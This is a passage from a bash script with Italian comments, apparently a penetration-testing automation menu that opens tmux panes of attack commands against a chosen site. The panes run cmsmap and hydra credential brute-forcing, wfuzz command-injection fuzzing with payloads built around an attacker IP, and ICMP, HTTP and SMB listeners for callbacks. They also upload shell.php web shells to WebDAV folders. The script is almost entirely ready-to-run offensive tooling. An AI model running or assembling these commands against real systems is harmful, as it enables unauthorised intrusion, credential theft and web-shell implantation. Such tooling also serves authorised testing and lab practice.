tmux send-keys -t PT:2.4 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
cd $folderProject


# WEB Command Injection
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:3 -n 'WEB Command Injection'
tmux split-window -v -t PT:3.0
tmux split-window -v -t PT:3.1
tmux split-window -v -t PT:3.2
tmux split-window -v -t PT:3.3
tmux select-pane -t "3.1"
tmux split-window -h -t "3.1"
tmux split-window -h -t "3.1"
tmux select-pane -t "3.4"
tmux split-window -h -t "3.4"
tmux select-pane -t "3.6"
tmux split-window -h -t "3.6"

# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# automate command injection scan" Enter
tmux send-keys -t PT:3.0 "sudo uniscan -u http://$site -qweds"
tmux send-keys -t PT:3.1 "# activate listener ICMP" Enter
tmux send-keys -t PT:3.1 "sudo tcpdump -i tun0 icmp"
tmux send-keys -t PT:3.2 "# activate listener HTTP" Enter
tmux send-keys -t PT:3.2 "python3 -m http.server 80"
tmux send-keys -t PT:3.3 "# activate listener SMB" Enter
tmux send-keys -t PT:3.3 "impacket-smbserver -smb2support htb \$(pwd)"
tmux send-keys -t PT:3.4 "# verify blocked chars (GET)" Enter
tmux send-keys -t PT:3.4 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
tmux send-keys -t PT:3.5 "# verify blocked chars (POST)" Enter
tmux send-keys -t PT:3.5 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php"
#Preparo il file per le command injection
cd $folderProjectEngine
#tmux send-keys -t PT:3.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
python ./cmdGenerator.py $attackerIP cmdlist.txt
mv "$folderProjectEngine\out-command-injection-list.txt $folderProjectWebAuthN\out-command-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:3.6 "# command injection automation (GET)" Enter
tmux send-keys -t PT:3.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
tmux send-keys -t PT:3.7 "# command injection automation (POST)" Enter
tmux send-keys -t PT:3.7 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
cd $folderProject




# WEB DAV
cd $folderProjectWebFingerprint
# Layout
tmux new-window -t PT:4 -n 'WEB DAV'
tmux split-window -v -t PT:4.0
tmux split-window -v -t PT:4.1
tmux split-window -v -t PT:4.2
tmux split-window -v -t PT:4.3
tmux select-pane -t "4.3"
tmux split-window -h -t "4.3"
tmux split-window -h -t "4.3"

# Esecuzione dei comandi nelle sottofinestre
 
tmux send-keys -t PT:4.0 "# Bruteforce attack to get Target Site Folders" Enter
tmux send-keys -t PT:4.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
tmux send-keys -t PT:4.1 "# Bruteforce attack to get credentials to specific folder" Enter
tmux send-keys -t PT:4.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
tmux send-keys -t PT:4.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
tmux send-keys -t PT:4.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
tmux send-keys -t PT:4.3 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:4.3 "cadaver $ip"
tmux send-keys -t PT:4.4 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:4.4 "curl -T shell.txt -u login:password http://$ip"
tmux send-keys -t PT:4.5 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:4.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
cd $folderProject



# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;







        *)
            echo "Scelta non valida. Per favore, scegli un numero da 0 a 6."
            ;;
    esac
done
